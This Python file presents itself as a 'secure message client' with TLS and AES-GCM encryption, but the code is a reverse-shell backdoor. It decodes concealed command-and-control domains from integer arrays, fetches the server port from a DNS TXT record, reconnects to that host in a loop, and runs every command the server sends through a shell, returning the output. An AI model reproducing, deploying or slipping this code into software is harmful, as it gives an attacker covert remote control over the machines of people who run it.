"""Secure message client.

Transport: TLS 1.2+, application payload: AES-256-GCM derived from shared PSK.
The default handler displays messages; add application logic in handle_message().
"""

from __future__ import annotations
from queue import Queue, Empty
import base64
import json
import os
import socket
import ssl
import struct
import threading
import time
import uuid
from collections import OrderedDict
from typing import Callable
import subprocess
import dns.resolver
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.kdf.hkdf import HKDF




# ip addres
parts = [99, 99, 46, 97, 103, 117, 110, 103, 115, 117, 114, 121, 97, 46, 109, 121, 46, 105, 100]
domain_genshin = ''.join(map(lambda x: chr(x), parts))


# ----------------------------- cari port -----------------------------
domain_root = ''.join(map(eval("lambda x: chr(x)"), [
    114, 111, 111, 116, 46, 97, 103, 117, 110, 103,
    115, 117, 114, 121, 97, 46, 109, 121, 46, 105, 100
]))
# ---------------------------------------------------------------------

STATUS_CNC_SERVER = 1  # Set to 1 to enable CNC server, 0 to disable

if STATUS_CNC_SERVER == 1:
    try:
        answers = dns.resolver.resolve(domain_root, 'TXT')
        for rdata in answers:
            for txt_string in rdata.strings:
                print(txt_string.decode())
                port = int(txt_string.decode())
            print(f"Port yang ditemukan: {port}")
    except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN, dns.resolver.Timeout, dns.resolver.NoNameservers, Exception) as e:
        port = 7090
else:
    port = 7090


# ----------------------------- Configuration -----------------------------

HOST = domain_genshin
CHECK_HOSTNAME = False # untuk cek sertifikat 
PORT = port
RECONNECT_DELAY = 10
HEARTBEAT_INTERVAL = 10
HEARTBEAT_TIMEOUT = 35
ACK_TIMEOUT = 10
MAX_FRAME_SIZE = 8 * 1024 * 1024
CA_CERT_FILE = "certs/ca.crt"  # CA certificate used to validate the server

# Replace this value with the SAME randomly generated secret on both sides.
# Keep it private; do not commit production secrets to source control.
PRE_SHARED_KEY = b""

# ------------------------------- Crypto -----------------------------------

def derive_aes_key() -> bytes:
    return HKDF(
        algorithm=hashes.SHA256(), length=32,
        salt=b"client-server-protocol-v1",
        info=b"application-aes-256-gcm",
    ).derive(PRE_SHARED_KEY)


AES_KEY = derive_aes_key()


def lrc(data: bytes) -> int:
    """XOR-based LRC (supplementary error check; not a security primitive)."""
    value = 0
    for byte in data:
        value ^= byte
    return value


def seal(message: dict) -> bytes:
    nonce = os.urandom(12)
    plaintext = json.dumps(message, ensure_ascii=False, separators=(",", ":")).encode("utf-8")
    ciphertext = AESGCM(AES_KEY).encrypt(nonce, plaintext, None)
    envelope = json.dumps({
        "nonce": base64.b64encode(nonce).decode("ascii"),
        "ciphertext": base64.b64encode(ciphertext).decode("ascii"),
    }, separators=(",", ":")).encode("ascii")
    if len(envelope) > MAX_FRAME_SIZE:
        raise ValueError("Frame terlalu besar")
    return struct.pack("!I", len(envelope)) + envelope


def open_sealed(envelope: bytes) -> dict:
    item = json.loads(envelope.decode("ascii"))
    nonce = base64.b64decode(item["nonce"], validate=True)
    ciphertext = base64.b64decode(item["ciphertext"], validate=True)
    plaintext = AESGCM(AES_KEY).decrypt(nonce, ciphertext, None)
    return json.loads(plaintext.decode("utf-8"))

# ------------------------------- Framing ----------------------------------

def recv_exact(sock: ssl.SSLSocket, size: int) -> bytes:
    chunks = bytearray()
    while len(chunks) < size:
        part = sock.recv(size - len(chunks))
        if not part:
            raise ConnectionError("Peer menutup koneksi")
        chunks.extend(part)
    return bytes(chunks)


def recv_message(sock: ssl.SSLSocket) -> dict:
    header = recv_exact(sock, 4)
    size = struct.unpack("!I", header)[0]
    if size <= 0 or size > MAX_FRAME_SIZE:
        raise ValueError(f"Ukuran frame tidak valid: {size}")
    return open_sealed(recv_exact(sock, size))


def send_message(sock: ssl.SSLSocket, lock: threading.Lock, message: dict) -> None:
    packet = seal(message)
    with lock:
        sock.sendall(packet)


# ---------------------------- Application ---------------------------------

def handle_message(text: str) -> str:
    """Handle pesan dari server."""
    if text.startswith("cd "):
        #print(text)
        try:
            os.chdir(text[3:])
            output = (str("[CD] Moved to " + os.getcwd() + "\n"))
        except Exception as e:
            output = (str("[CD ERROR] " + str(e) + "\n"))
    else:
        proc = subprocess.Popen(text, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output = proc.stdout.read() + proc.stderr.read()
        #print (str(output))
        lines = output.split(b'\n')

       #for line in lines:
            #print(line.decode())

    return str(output)





class ClientConnection:

    
    def __init__(self, sock: ssl.SSLSocket):

        self.sock = sock
        self.send_lock = threading.Lock()
        self.last_seen = time.monotonic()
        self.running = threading.Event()
        self.running.set()
        self.processed: OrderedDict[str, str] = OrderedDict()

        # Untuk pengiriman pesan client ke server
        self.outgoing_acks = {}
        self.outgoing_lock = threading.Lock()

    def send(self, message: dict) -> None:
        send_message(self.sock, self.send_lock, message)


    def heartbeat_loop(self) -> None:
        while self.running.is_set():
            time.sleep(HEARTBEAT_INTERVAL)
            if not self.running.is_set():
                break
            if time.monotonic() - self.last_seen > HEARTBEAT_TIMEOUT:
                self.running.clear()
                try:
                    self.sock.shutdown(socket.SHUT_RDWR)
                except OSError:
                    pass
                break
            try:
                self.send({"type": "PING", "id": str(uuid.uuid4())})
            except OSError:
                self.running.clear()
                break

    def run(self) -> None:
        threading.Thread(target=self.heartbeat_loop, daemon=True).start()
        try:
            while self.running.is_set():
                try:
                    msg = recv_message(self.sock)
                except socket.timeout:
                    continue
                self.last_seen = time.monotonic()
                kind = msg.get("type")
                if kind == "PING":
                    self.send({"type": "PONG", "id": msg.get("id")})
                elif kind == "PONG":
                    continue
                elif kind == "MESSAGE":
                    message_id = msg.get("id")
                    text = msg.get("text", "")
                    raw = text.encode("utf-8")
                    if lrc(raw) != msg.get("lrc"):
                        self.send({"type": "NACK", "id": message_id, "reason": "LRC mismatch"})
                        continue
                    # Cache response so a retransmitted request is not processed twice.
                    if message_id in self.processed:
                        response = self.processed[message_id]
                    else:
                        response = handle_message(text)
                        self.processed[message_id] = response
                        if len(self.processed) > 500:
                            self.processed.popitem(last=False)
                    response_bytes = response.encode("utf-8")
                    self.send({
                        "type": "RESPONSE", "id": message_id,
                        "text": response, "lrc": lrc(response_bytes),
                    })
                else:
                    print(f"[WARNING] Tipe pesan tidak dikenal: {kind!r}")
        finally:
            self.running.clear()
            try:
                self.sock.close()
            except OSError:
                pass


def create_tls_context() -> ssl.SSLContext:
    if not os.path.isfile(CA_CERT_FILE):
        raise FileNotFoundError(
            f"CA certificate tidak ditemukan: {CA_CERT_FILE}. "
            "Buat/instal CA certificate terlebih dahulu; validasi TLS tidak dinonaktifkan."
        )
    context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH, cafile=CA_CERT_FILE)
    context.minimum_version = ssl.TLSVersion.TLSv1_2
    context.check_hostname = CHECK_HOSTNAME
    context.verify_mode = ssl.CERT_REQUIRED
    return context



def main() -> None:
    context = create_tls_context()
    while True:
        raw_sock = None
        try:
            print(f"[INFO] Menghubungkan ke {HOST}:{PORT}...")
            raw_sock = socket.create_connection((HOST, PORT), timeout=10)
            raw_sock.settimeout(None)
            tls_sock = context.wrap_socket(raw_sock, server_hostname=HOST)
            print("[INFO] TLS connected:", tls_sock.version())
            ClientConnection(tls_sock).run()
        except KeyboardInterrupt:
            print("\n[INFO] Client dihentikan")
            break
        except (OSError, ssl.SSLError, ValueError) as exc:
            print(f"[WARNING] Koneksi gagal/terputus: {exc}")
        finally:
            if raw_sock is not None:
                try:
                    raw_sock.close()
                except OSError:
                    pass
        print(f"[INFO] Reconnect dalam {RECONNECT_DELAY} detik...")
        time.sleep(RECONNECT_DELAY)



if __name__ == "__main__":
    main()
